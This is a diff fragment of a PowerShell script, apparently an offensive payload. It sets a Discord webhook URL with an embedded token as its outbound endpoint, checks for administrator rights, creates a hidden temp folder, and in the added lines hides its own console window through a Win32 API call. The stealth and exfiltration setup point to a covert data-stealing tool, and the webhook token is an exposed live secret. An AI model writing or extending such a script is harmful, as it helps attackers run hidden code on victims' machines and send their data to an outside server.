@@ -2,6 +2,24 @@ $webhook = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gs
 $IsAdmin = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 $Admin = $IsAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 $dir = "$env:temp\JHknfuiD"
+$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
+Function HideConsole{
+    If ($HideWindow -gt 0){
+    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+    $hwnd = (Get-Process -PID $pid).MainWindowHandle
+        if($hwnd -ne [System.IntPtr]::Zero){
+            $Type::ShowWindowAsync($hwnd, 0)
+        }
+        else{
+            $Host.UI.RawUI.WindowTitle = 'hideme'
+            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+            $hwnd = $Proc.MainWindowHandle
+            $Type::ShowWindowAsync($hwnd, 0)
+        }
+    }
+}
+HideConsole
 if (!(Test-Path -Path "$dir")) {
 New-Item -ItemType Directory -Path "$dir"
 }
